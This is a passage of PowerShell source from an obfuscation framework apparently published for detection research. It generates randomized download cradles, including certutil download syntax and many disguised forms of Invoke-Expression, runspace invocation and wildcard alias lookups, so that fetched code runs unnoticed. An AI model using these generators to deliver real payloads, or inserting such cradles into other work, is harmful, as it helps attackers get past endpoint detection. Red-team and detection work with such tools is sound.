                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

                            # Create separate variables for DownloadFile method with quotes added to $Path.
                            $PathQuoted = "'$Path'"

                            # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                            $PathSourced = $Path

                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            If($Path.StartsWith('<<<') -AND ($Path.SubString(4) -NotMatch '^([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathSourced = $Path.SubString(0,4) + $SourceRandom + $Path.SubString(4)
                            }
                            ElseIf($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                            {
                                $PathSourced = "$SourceRandom$Path"
                            }

                            # If Invocation is dot-source or Import-Module/IPMO then when $Path is set as a variable it must be dot-sourced.
                            If(($Invoke -Match '^(<<<[01]|)(Import-Module|IPMO|[.]) ') -AND ($Path -NotMatch '^(<<<[01]|)([A-Z]:|\\\\|.[/\\])'))
                            {
                                $PathQuoted = $PathQuoted.Replace($Path,"$SourceRandom$Path")
                            }
                        }

                        $IsDiskCradle = $FALSE

                        If($Invoke -eq $InvokeTag)
                        {
                            $SyntaxToInvoke = ''
                        }
                        ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                        {
                            $SyntaxToInvoke = $Invoke.Replace($PathTag,$GetVar2)
                            $Invoke         = $InvokeTag
                            $IsDiskCradle   = $TRUE
                        }
                        Else
                        {
                            $SyntaxToInvoke = $GetBytesRandom.Replace("'$PathTag'",$PathTag).Replace($PathTag,$GetVar2)
                        }

                        # Add quotes if $Url or $Path contains whitespace.
                        If($Url.Contains(' ') -AND !($Url -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Url -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Url = "'$Url'"
                        }
                        If($Path.Contains(' ') -AND !($Path -Match '^(|<<<[01])[(].*[)][.]Value(|[01]>>>)$') -AND !($Path -Match ('^(|<<<[01])[(].* -Va[lueOny]{0,7}[)](|[01]>>>)$')))
                        {
                            $Path = "'$Path'"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"
                        $CommandArray += "$SetVar2$PathQuoted"
                        $CommandArray += "`$NULL=$Certutil $Flags $GetVar1 $GetVar2"

                        If($Invoke.Contains($CommandTag) -OR $Invoke.Contains($CommandEscapedStringTag))
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                            }
                        }
                        Else
                        {
                            If(($Invoke -ne $InvokeTag) -OR $IsDiskCradle)
                            {
                                $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke)
                            }
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray[$ArrayIndexOrder_01] + $CommandArray[2,3,4]) -Join ';'

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        default {Write-Error "An invalid `$Cradle value ($Cradle) was passed to switch block for Out-Cradle."; Exit}
    }

    If($PSBoundParameters['ReturnAsArray'])
    {
        # Remove any remainign ModuleAutoLoad tags used for PS3.0+ when dealing with PS1.0 syntax for GetCmdlet method before required modules are loaded.
        If($CradleSyntaxOptions[0].Contains($ModuleAutoLoadTag))
        {
            $CradleSyntaxOptions[0] = $CradleSyntaxOptions[0].Replace($ModuleAutoLoadTag,'')
            $CradleSyntaxOptions[1] = $CradleSyntaxOptions[1].Replace($ModuleAutoLoadTag,'')
        }

        If($AllOptionSelected)
        {
            # When All option is selected then Rearrange is set to 9 and the maximum option(s) is selected in each Switch block as there are differing numbers per cradle type.
            # We will overwrite the correct Rearrange option in $Script:TokensUpdatedThisIteration before returning it to Invoke-CradleCrafter.ps1.
            ForEach($Token in $Script:TokensUpdatedThisIteration)
            {
                If($Token[0] -eq 'Rearrange') {$Token[1] = $Rearrange}
            }
        }

        $CradleSyntaxOptions[2] = @($Script:TokensUpdatedThisIteration)

        # Return both cradle syntax and cradle syntax with tags for display purposes.
        Return $CradleSyntaxOptions
    }
    Else
    {
        # Return only the cradle syntax, NOT an array with cradle syntax and cradle syntax with tags for display purposes.
        # This will be used when CLI is used and not tagged result is needed for display purposes.
        Return $CradleSyntaxOptions[0]
    }
}


Function Set-GetSetVariables
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates various levels of randomized Get-Variable and Set-Variable syntax and variable names if not already defined or if current option is Rearrange or All.

Invoke-CradleCrafter Function: Set-GetSetVariables
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-GetVariable and Out-SetVariable (all located in Out-Cradle.ps1)
Optional Dependencies: None
 
.DESCRIPTION

Set-GetSetVariables generates various levels of randomized Get-Variable and Set-Variable syntax and variable names if not already defined or if current option is Rearrange or All.

.PARAMETER NumberOfVarNames

Specifies the number of Get-Variable and Set-Variable syntaxes to generate.

.PARAMETER VarOptionsIndex

Specifies the level of randomization for syntax:
0) $Var='value'; $Var
1) (Set-Variable 'Var' 'value'); (Get-Variable 'Var').Value

.EXAMPLE

C:\PS> $RandomVarName1 = 'var1'; $RandomVarName2 = 'var2'; (Set-GetSetVariables 2 0) | ForEach-Object {(Get-Variable $_).Value}

$var1=
$var1
$var2=
$var2

C:\PS> $RandomVarName1 = 'var1'; $RandomVarName2 = 'var2'; (Set-GetSetVariables 2 1) | ForEach-Object {(Get-Variable $_).Value}

SI Variable:var1 
(Get-Variable var1 -ValueO)
Set-Item Variable:var2 
(GV var2).Value

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [ValidateSet(1,2,3,4,5,6,7,8)]
        [Int]
        $NumberOfVarNames,

        [ValidateNotNullOrEmpty()]
        [ValidateSet(0,1)]
        [Int]
        $VarOptionsIndex
    )

    $NewVarArray = @()

    For($j=1; $j -le $NumberOfVarNames; $j++)
    {
        $SetVarName = 'SetVar' + $j
        $GetVarName = 'GetVar' + $j

        # Set default Get/Set variable syntax.
        $SetVariableRandom = '$' + $VarTag1 + '='
        $GetVariableRandom = '$' + $VarTag1

        # If $VarOptionsIndex isn't the lowest level then keep calling Out-GetVariable and Out-SetVariable until a non-default '$' variable syntax is returned.
        If($VarOptionsIndex -gt 0)
        {
            # Generate random Get Variable syntax.
            $GetVariableRandom = Out-GetVariable $VarTag1
            While($GetVariableRandom.StartsWith('$'))
            {
                $GetVariableRandom = Out-GetVariable $VarTag1
            }

            # Generate random Set Variable syntax.
            $SetVariableRandom = Out-SetVariable $VarTag1
            While($SetVariableRandom.StartsWith('$'))
            {
                $SetVariableRandom = Out-SetVariable $VarTag1
            }
        }

        # If both the local variable and script-level variable exist and don't match then overwrite the script-level variable with the local variable (as it is our current value).
        If(((Test-Path ('Variable:' + $SetVarName))) -AND ((Get-Variable $SetVarName).Value -ne (Get-Variable $SetVarName -Scope 'Script').Value))
        {
            Set-Variable $SetVarName (Get-Variable $SetVarName).Value -Scope 'Script'
        }
        If(((Test-Path ('Variable:' + $GetVarName))) -AND ((Get-Variable $GetVarName).Value -ne (Get-Variable $GetVarName -Scope 'Script').Value))
        {
            Set-Variable $GetVarName (Get-Variable $GetVarName).Value -Scope 'Script'
        }

        # Create new randomized Get and Set variable syntax and variable names if they do not already exist (i.e. being passed in via TokenArray) or if current option is Rearrange or All.
        If(!(Test-Path ('Variable:' + $SetVarName)) -OR ($TokenNameUpdatedThisIteration -eq 'Rearrange') -OR $AllOptionSelected)
        {
            Set-Variable $SetVarName $SetVariableRandom.Replace($VarTag1,(Get-Variable ('RandomVarName' + $j)).Value) -Scope 'Script'
        }
        If(!(Test-Path ('Variable:' + $GetVarName)) -OR ($TokenNameUpdatedThisIteration -eq 'Rearrange') -OR $AllOptionSelected)
        {
            Set-Variable $GetVarName $GetVariableRandom.Replace($VarTag1,(Get-Variable ('RandomVarName' + $j)).Value) -Scope 'Script'
        }
    
        # If Rearrange or All is the option being run then add appropriate tags to these Get/Set-Variable variables.
        $TagStart = ''
        $TagEnd   = ''
        If(($TokenNameUpdatedThisIteration -eq 'Rearrange') -OR $AllOptionSelected)
        {
            $TagStart = '<<<0'
            $TagEnd   = '0>>>'
        }

        Set-Variable ($SetVarName + 'WithTags') ($TagStart + (Get-Variable ($SetVarName) -Scope 'Script').Value + $TagEnd) -Scope 'Script'
        Set-Variable ($GetVarName + 'WithTags') ($TagStart + (Get-Variable ($GetVarName) -Scope 'Script').Value + $TagEnd) -Scope 'Script'

        $NewVarArray += ($SetVarName)
        $NewVarArray += ($GetVarName)

        # Add Set and Get syntaxes to $Script:TokensUpdatedThisIteration to be returned with everything else so we can maintain the state of these values for each subsequent call.
        $Script:TokensUpdatedThisIteration += , @($SetVarName,(Get-Variable ($SetVarName) -Scope 'Script').Value)
        $Script:TokensUpdatedThisIteration += , @($GetVarName,(Get-Variable ($GetVarName) -Scope 'Script').Value)
    }

    Return $NewVarArray
}


Function Out-EncapsulatedInvokeExpression
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates random syntax for invoking input PowerShell command.

Invoke-CradleCrafter Function: Out-EncapsulatedInvokeExpression
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-GetVariable, Out-SetVariable, Out-PsGetCmdlet (all located in Out-Cradle.ps1)
Optional Dependencies: None
 
.DESCRIPTION

Out-EncapsulatedInvokeExpression generates random syntax for invoking PowerShell expressions, scriptblocks, etc. It contains multiple invocation types denoted by $InvokeLevel input variable.

.PARAMETER InvokeLevel

Specifies the invocation type from which a randomized syntax will be generated.

.EXAMPLE

C:\PS> Out-EncapsulatedInvokeExpression 2

<INVOKETAG>|Invoke-Expression

C:\PS> Out-EncapsulatedInvokeExpression 3

.(Get-Alias *EX) <INVOKETAG>

C:\PS> Out-EncapsulatedInvokeExpression 9

.( ([String]''.Chars)[11,18,19]-Join'')<INVOKETAG>

C:\PS> Out-EncapsulatedInvokeExpression 10

Invoke-AsWorkflow -Expr (<INVOKETAG>)

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [ValidateSet(1,2,3,4,5,6,7,8,9,10,11,12,13)]
        [Int]
        $InvokeLevel
    )

    # Handle overloaded invocation numbers for invocation 11. This should be Dot-Source by default (for disk-based cradles) but will be changed to 13 for Inline and Compiled script invocation.
    If((@(15,16) -Contains $Cradle) -AND ($InvokeLevel -eq 11))
    {
        $InvokeLevel = 13
    }

    # Flag substrings
    $FullArgument            = "-Expression"
    $ExpressionFlagSubString = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))

    # Create random variable name with random case for certain invocation syntax options.
    $VarNameCharacters   = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9')
    $RandomInvokeVarName = (Get-Random -Input $VarNameCharacters -Count (Get-Random -Input @(1..3)) | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''

    # Generate random Set and Get syntax for newly created variable name above.
    $SetRandomInvokeVarName = Out-SetVariable $RandomInvokeVarName
    $GetRandomInvokeVarName = Out-GetVariable $RandomInvokeVarName

    # Set all necessary variables to be combined together in below Switch block for each $InvokeLevel value passed into this function.
    $InvocationOperator     = Get-Random -Input @('.','&')
    $RandomInvokeCommand    = Get-Random -Input @('Invoke-Command','ICM','.','&')
    $RandomIEX              = Get-Random -Input @('IE*','I*X','*EX')
    $RandomInvokeExpression = Get-Random -Input @('In*-Ex*ion','*-Ex*n','*e-*press*','*ke-*pr*','*e-Ex*','I*e-E*','I*-E*n','In*ssi*')
    
    # Generate random ForEach-Object cmdlet syntax.
    $ForEach  = Get-Random -Input @('ForEach-Object','ForEach','%')
    $ForEach2 = Get-Random -Input @('ForEach-Object','ForEach','%')
    
    Switch($InvokeLevel)
    {
        1 {
            # No Invoke
            
            $Result = $InvokeTag
        }
        2 {
            # IEX/Invoke-Expression
            
            $Invoke = Get-Random -Input @('Invoke-Expression','IEX')

            $Result = Get-Random -Input @(($Invoke + ' ' + $InvokeTag),($Invoke + '(' + $InvokeTag + ')'),($InvokeTag + '|' + $Invoke))
        }
        3 {
            # Get-Alias/GAL/Alias
            
            $GetAliasRandom = Get-Random -Input @('Get-Alias ','GAL ','Alias ',((Get-Random -Input @('DIR','Get-ChildItem','GCI','ChildItem','LS','Get-Item','GI','Item')) + (Get-Random -Input @(' Alias:\',' Alias:/',' Alias:'))))

            $Invoke = "$InvocationOperator($GetAliasRandom$RandomIEX)"

            $Result = Get-Random -Input @(($Invoke + ' ' + $InvokeTag),($Invoke + '(' + $InvokeTag + ')'),($InvokeTag + '|' + $Invoke))
        }
        4 {
            # Get-Command/GCM --  COMMAND only works in PS3.0+ so we're not including it here.
            
            $Invoke = $InvocationOperator + '(' + (Get-Random -Input @('Get-Command','GCM','COMMAND')) + ' ' + $RandomInvokeExpression + ')'
    
            $Result = Get-Random -Input @(($Invoke + ' ' + $InvokeTag),($Invoke + '(' + $InvokeTag + ')'),($InvokeTag + '|' + $Invoke))
        }
        5 {
            # $ExecutionContext.InvokeCommand.GetCommand/GetCmdlet/GetCmdlets/GetCommandName

            # Generate PS 1.0 syntax for getting command/cmdlet.
            $GetCmdletIEX = Out-PsGetCmdlet $RandomInvokeExpression

            $Result = Get-Random -Input @(($GetCmdletIEX + $InvokeTag),($InvokeTag + '|' + $GetCmdletIEX))
        }
        6 {
            # $ExecutionContext.InvokeCommand.InvokeScript

            # Handle syntax differently if PostCradleCommand is present or not since it will need to be combined with our regular cradle result since everything must be executed within the same ScriptBlock/RunSpace.
            If($Command)
            {
                $InvokeTag = $InvokeTag + $CommandEscapedStringTag
            }

            # Generate numerous ways to invoke $InvokeTag.
            $InvokeSyntax  = @()
            $InvokeSyntax += "$ExecContextVariable.$InvokeCommand.$InvokeScript($InvokeTag)"
            $InvokeSyntax += "$ExecContextVariable|$ForEach{$CurrentItemVariable.$InvokeCommand.$InvokeScript($InvokeTag)}"
            $InvokeSyntax += "$ExecContextVariable.$InvokeCommand|$ForEach{$CurrentItemVariable2.$InvokeScript($InvokeTag)}"
            $InvokeSyntax += "$ExecContextVariable|$ForEach{$CurrentItemVariable.$InvokeCommand|$ForEach2{$CurrentItemVariable2.$InvokeScript($InvokeTag)}}"

            $Result = Get-Random -Input $InvokeSyntax            
        }
        7 {
            # ICM/Invoke-Command/.Invoke()/.InvokeReturnAsIs() + ScriptBlock Conversion
            
            # Handle syntax differently if PostCradleCommand is present or not since it will need to be combined with our regular cradle result since everything must be executed within the same ScriptBlock/RunSpace.
            If($Command)
            {
                $InvokeTag = $InvokeTag + $CommandEscapedStringTag
            }

            # Select random syntax for converting expression or command to a script block.
            $ScriptBlockConversionSyntax  = @()
            $ScriptBlockConversionSyntax += "[ScriptBlock]::Create($InvokeTag)"
            $ScriptBlockConversionSyntax += Get-Random -Input @("$ExecContextVariable.$InvokeCommand.$NewScriptBlock($InvokeTag)","($ExecContextVariable|$ForEach{$CurrentItemVariable.$InvokeCommand.$NewScriptBlock($InvokeTag)})","($ExecContextVariable.$InvokeCommand|$ForEach{$CurrentItemVariable2.$NewScriptBlock($InvokeTag)})","($ExecContextVariable|$ForEach{$CurrentItemVariable.$InvokeCommand|$ForEach2{$CurrentItemVariable2.$NewScriptBlock($InvokeTag)}})")
            $ScriptBlockConversion = Get-Random -Input $ScriptBlockConversionSyntax
    
            $InvokeMethod = Get-Random -Input @('.Invoke()','.InvokeReturnAsIs()')
            $Result = Get-Random -Input @(($RandomInvokeCommand + '(' + $ScriptBlockConversion + ')' ),($ScriptBlockConversion + $InvokeMethod))
        }
        8 {
            # PS Runspace - Thanks to noted Blue Teamer, Matt Graeber (@mattifestation), for this invocation suggestion.

            # Generate random substrings for Get-Member wildcard syntax for AddScript and Dispose methods.
            $AddScriptMethodString = Get-Random -Input @('A*Sc*','A*S*pt','*Sc*','*cri*','*rip*','*ip*','*pt*','*pt','A*pt','*ddSc*','*d*rip*','*S*i*t','*d*c*t')
            $DisposeMethodString   = Get-Random -Input @('D*','Di*','D*e','*isp*','*spo*','*pos*','*pose*','*se','D*p*')
            
            # Set alternate syntax for members used in Runspace syntax.
            $AddScriptWithVariable        = Get-Random -Input @('AddScript',"((`$$RandomInvokeVarName|$GetMemberRandom)[5].Name).Invoke","(($GetRandomInvokeVarName.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$AddScriptMethodString'}).Name).Invoke","(($GetRandomInvokeVarName|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$AddScriptMethodString'}).Name).Invoke")
            $AddScriptWithoutVariable     = Get-Random -Input @('AddScript',"(([PowerShell]::Create()|$GetMemberRandom)[5].Name).Invoke","(([PowerShell]::Create().PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$AddScriptMethodString'}).Name).Invoke","(([PowerShell]::Create()|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$AddScriptMethodString'}).Name).Invoke")
            $DisposeMethodWithVariable    = Get-Random -Input @('Dispose()',"(($GetRandomInvokeVarName.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$DisposeMethodString'}).Name).Invoke()","(($GetRandomInvokeVarName|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$DisposeMethodString'}).Name).Invoke()")
            $DisposeMethodWithoutVariable = Get-Random -Input @('Dispose()',"(([PowerShell]::Create().PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$DisposeMethodString'}).Name).Invoke()","(([PowerShell]::Create()|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable2.Name$LikeFlagRandom'$DisposeMethodString'}).Name).Invoke()")

            # Add extra encapsulation of parentheses if Set-Variable syntax is used.
            $PowerShellCreatePotentiallyEncapsulated = "[PowerShell]::Create()"
            If($SetRandomInvokeVarName.EndsWith(' '))
            {
                $PowerShellCreatePotentiallyEncapsulated = '(' + $PowerShellCreatePotentiallyEncapsulated + ')'
            }

            # Handle syntax differently if PostCradleCommand is present or not since it will need to be combined with our regular cradle result since everything must be executed within the same ScriptBlock/RunSpace.
            If($Command)
            {
                # Generate numerous ways to invoke a combined $InvokeTag and $CommandTag.
                $InvokeSyntax  = @()
                $InvokeSyntax += "'$RandomInvokeVarName'|$ForEach{$SetRandomInvokeVarName$PowerShellCreatePotentiallyEncapsulated}{$Void$GetRandomInvokeVarName.$AddScriptWithVariable(($InvokeTag))}{$Void$GetRandomInvokeVarName.$AddScriptWithVariable({$CommandTag})}{$GetRandomInvokeVarName.Invoke()}{$GetRandomInvokeVarName.$DisposeMethodWithVariable}"
                $InvokeSyntax += "'$RandomInvokeVarName'|$ForEach{$SetRandomInvokeVarName$PowerShellCreatePotentiallyEncapsulated}{$Void$GetRandomInvokeVarName.$AddScriptWithVariable(($InvokeTag)).$AddScriptWithVariable({$CommandTag})}{$GetRandomInvokeVarName.Invoke()}{$GetRandomInvokeVarName.$DisposeMethodWithoutVariable}"
                $InvokeSyntax += "[PowerShell]::Create().$AddScriptWithoutVariable(($InvokeTag)).$AddScriptWithoutVariable({$CommandTag}).Invoke()"
                $InvokeSyntax += "[PowerShell]::Create().$AddScriptWithoutVariable(($InvokeTag|$ForEach{$CurrentItemVariable$CommandEscapedStringTag})).Invoke()"
            }
            Else
            {
                # Generate numerous ways to invoke $InvokeTag.
                $InvokeSyntax  = @()
                $InvokeSyntax += "'$RandomInvokeVarName'|$ForEach{$SetRandomInvokeVarName$PowerShellCreatePotentiallyEncapsulated}{$Void$GetRandomInvokeVarName.$AddScriptWithVariable(($InvokeTag))}{$GetRandomInvokeVarName.Invoke()}{$GetRandomInvokeVarName.Dispose()}"
                $InvokeSyntax += "[PowerShell]::Create().$AddScriptWithoutVariable(($InvokeTag)).Invoke()"
            }
            # Select random option from above.
            $Result = Get-Random -Input $InvokeSyntax
        }
        9 {
            # Concatenated IEX  --> .($env:ComSpec[4,15,25]-Join''), etc.

            # Substitution tags for JOIN and STRING syntaxes used by certain values in $ConcatenatedIEX in below step.
            $JoinTag      = '<VALUETOJOIN>'
            $JoinSyntax   = Get-Random -Input @("($JoinTag-Join'')","(-Join($JoinTag))","([String]::Join('',($JoinTag)))")
            $StringTag    = "<STRINGTOREPLACE>"
            $StringSyntax = Get-Random -Input @("([String]$StringTag)","$StringTag.ToString()")

            # Random wildcard strings for variables used in $ConcatenatedIEX array in below step.
            $ShellId1      = (Get-Random -Input @('ShellId','She*d','S*Id','S*ell*d'))
            $ShellId2      = (Get-Random -Input @('ShellId','She*d','S*Id','S*ell*d'))
            $PsHome1       = (Get-Random -Input @('PsHome','PsH*','P*ho*','P*ome'))
            $PsHome2       = (Get-Random -Input @('PsHome','PsH*','P*ho*','P*ome'))
            $Env_ComSpec   = (Get-Random -Input @('env:','env:\','env:/')) + (Get-Random -Input @('ComSpec','C*S*c','Co*pec','*o*pec','*o*S*ec'))
            $MaxDriveCount = (Get-Random -Input @('MaximumDriveCount','M*Dr*','Ma*D*','*i*D*i*e*t','*i*D*o*nt','*mumD*un*t'))
            $VerbosePref   = (Get-Random -Input @('VerbosePreference','Ve*e','Verb*','*bos*e','*r*os*e','*seP*e'))
            # Commenting below options since $env:Public differs in string value for non-English operating systems.
            #$Env_Public    = (Get-Random -Input @('env:','env:\','env:/')) + (Get-Random -Input @('Public','P*ic','Pub*','*ic','*lic','*b*ic'))
            #$Env_Public2   = (Get-Random -Input @('env:','env:\','env:/')) + (Get-Random -Input @('Public','P*ic','Pub*','*ic','*lic','*b*ic'))

            # The below code block is copy/pasted from the Out-EncapsulatedInvokeExpression function from Invoke-Obfuscation's Out-ObfuscatedStringCommand.ps1.
            # Changes to the Out-EncapsulatedInvokeExpression function in the Invoke-Obfuscation project should be copied into below InvokeExpressionSyntax block and vice versa.
            # Generate random invoke operation syntax.
            $ConcatenatedIEX  = @()
            # Added below slightly-randomized obfuscated ways to form the string 'iex' and then invoke it with . or &.
            # Though far from fully built out, these are included to highlight how IEX/Invoke-Expression is a great indicator but not a silver bullet.
            # These methods draw on common environment variable values and PowerShell Automatic Variable values/methods/members/properties/etc.
            $ConcatenatedIEX += $InvocationOperator + "( " + (Out-GetVariable $ShellId1) + "[1]+" + (Out-GetVariable $ShellId2) + "[13]+'x')"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Out-GetVariable $PSHome1) + "[" + (Get-Random -Input @(4,21)) + "]+" + (Out-GetVariable $PSHome2) + "[" + (Get-Random -Input @(30,34)) + "]+'x')"
            $ConcatenatedIEX += $InvocationOperator + $JoinSyntax.Replace($JoinTag,((Out-GetVariable $Env_ComSpec) + "[4," + (Get-Random -Input @(15,24,26)) + ",25]"))
            $ConcatenatedIEX += $InvocationOperator + $JoinSyntax.Replace($JoinTag,("(" + (Get-Random -Input @('Get-Variable','GV','Variable')) + " $MaxDriveCount).Name[3,11,2]"))
            $ConcatenatedIEX += $InvocationOperator + '(' + $JoinSyntax.Replace($JoinTag,$StringSyntax.Replace($StringTag,(Out-GetVariable $VerbosePref)) + '[1,3]') + "+'x')"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.Insert)"         , "''.Insert.ToString()"))         + '[' + (Get-Random -Input @(3,7,14,23,33)) + ',' + (Get-Random -Input @(10,26,41)) + ",27]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.Normalize)"      , "''.Normalize.ToString()"))      + '[' + (Get-Random -Input @(3,13,23,33,55,59,77)) + ',' + (Get-Random -Input @(15,35,41,45)) + ",46]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.Chars)"          , "''.Chars.ToString()"))          + '[' + (Get-Random -Input @(11,15)) + ',' + (Get-Random -Input @(18,24)) + ",19]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.SubString)"      , "''.SubString.ToString()"))      + '[' + (Get-Random -Input @(3,13,17,26,37,47,51,60,67)) + ',' + (Get-Random -Input @(29,63,72)) + ',' + (Get-Random -Input @(30,64)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.Remove)"         , "''.Remove.ToString()"))         + '[' + (Get-Random -Input @(3,14,23,30,45,56,65)) + ',' + (Get-Random -Input @(8,12,26,50,54,68)) + ',' + (Get-Random -Input @(27,69)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.LastIndexOfAny)" , "''.LastIndexOfAny.ToString()")) + '[' + (Get-Random -Input @(0,8,34,42,67,76,84,92,117,126,133)) + ',' + (Get-Random -Input @(11,45,79,95,129)) + ',' + (Get-Random -Input @(12,46,80,96,130)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.LastIndexOf)"    , "''.LastIndexOf.ToString()"))    + '[' + (Get-Random -Input @(0,8,29,37,57,66,74,82,102,111,118,130,138,149,161,169,180,191,200,208,216,227,238,247,254,266,274,285,306,315,326,337,345,356,367,376,393,402,413,424,432,443,454,463,470,491,500,511)) + ',' + (Get-Random -Input @(11,25,40,54,69,85,99,114,141,157,172,188,203,219,235,250,277,293,300,333,348,364,379,387,420,435,451,466,485,518)) + ',' + (Get-Random -Input @(12,41,70,86,115,142,173,204,220,251,278,349,380,436,467)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.IsNormalized)"   , "''.IsNormalized.ToString()"))   + '[' + (Get-Random -Input @(5,13,26,34,57,61,75,79)) + ',' + (Get-Random -Input @(15,36,43,47)) + ",48]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.IndexOfAny)"     , "''.IndexOfAny.ToString()"))     + '[' + (Get-Random -Input @(0,4,30,34,59,68,76,80,105,114,121)) + ',' + (Get-Random -Input @(7,37,71,83,117)) + ',' + (Get-Random -Input @(8,38,72,84,118)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.IndexOf)"        , "''.IndexOf.ToString()"))        + '[' + (Get-Random -Input @(0,4,25,29,49,58,66,70,90,99,106,118,122,133,145,149,160,171,180,188,192,203,214,223,230,242,246,257,278,287,298,309,313,324,335,344,361,370,381,392,396,407,418,427,434,455,464,475)) + ',' + (Get-Random -Input @(7,21,32,46,61,73,87,102,125,141,152,168,183,195,211,226,249,265,272,305,316,332,347,355,388,399,415,430,449,482)) + ',' + (Get-Random -Input @(8,33,62,74,103,126,153,184,196,227,250,317,348,400,431)) + "]-Join''" + ")"
            # Commenting below option since $env:Public differs in string value for non-English operating systems.
            #$ConcatenatedIEX += $InvocationOperator + "( " + (Out-GetVariable $Env_Public) + "[13]+" + (Out-GetVariable $Env_Public2) + "[5]+'x')"
            
            # Select random option from above.
            $ConcatenatedIEX = Get-Random -Input $ConcatenatedIEX

            $Result = Get-Random -Input @(($ConcatenatedIEX + $InvokeTag),($InvokeTag + '|' + $ConcatenatedIEX))
        }
        10 {
            # Invoke-AsWorkflow (PS 3.0+)
            
            # Handle syntax differently if PostCradleCommand is present or not since it will need to be combined with our regular cradle result since everything must be executed within the same ScriptBlock/RunSpace.
            If($Command)
            {
                $Result = "Invoke-AsWorkflow $ExpressionFlagSubString ($InvokeTag$CommandEscapedStringTag)"
            }
            Else
            {
                $Result = "Invoke-AsWorkflow $ExpressionFlagSubString ($InvokeTag)"
            }
        }
        11 {
            # Dot-Source (Disk-Based Invocation)
            
            $Result = ". $PathTag"
        }
        12 {
            # Import-Module/IPMO (Disk-Based Invocation)
            
            $Result = (Get-Random -Input @('Import-Module','IPMO')) + " $PathTag"
        }
        13 {
            # PS Runspace Inline (Inline Scripting Invocation)

            $Result = $InlineScriptTag + $InvokeTag
        }
